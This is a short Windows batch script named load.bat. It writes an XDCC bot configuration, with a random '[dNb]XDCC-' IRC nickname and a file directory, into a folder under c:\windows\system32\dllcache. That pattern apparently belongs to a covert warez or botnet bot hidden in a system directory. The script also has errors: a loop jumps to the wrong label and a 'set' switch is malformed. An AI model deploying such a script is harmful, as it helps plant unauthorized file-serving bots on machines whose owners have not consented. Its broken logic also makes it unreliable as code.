@echo off
cd c:\windows\system32\dllcache\win32
:again
set mynumber=%random%
if %mynumber% GTR 1000 goto again
if %mynumber% LSS 100 goto again
set \a mynumber=%mynumber%
:again2
set mynumber2=%random%
if %mynumber2% GTR 1000 goto again
if %mynumber2% LSS 100 goto again
set \a mynumber2=%mynumber2%
ECHO user_nick [dNb]XDCC-%mynumber%%mynumber2%>> xdcc.config
ECHO filedir c:\windows\system32\dllcache\win32\DAP\LOG\>> xdcc.config
:: load.bat ends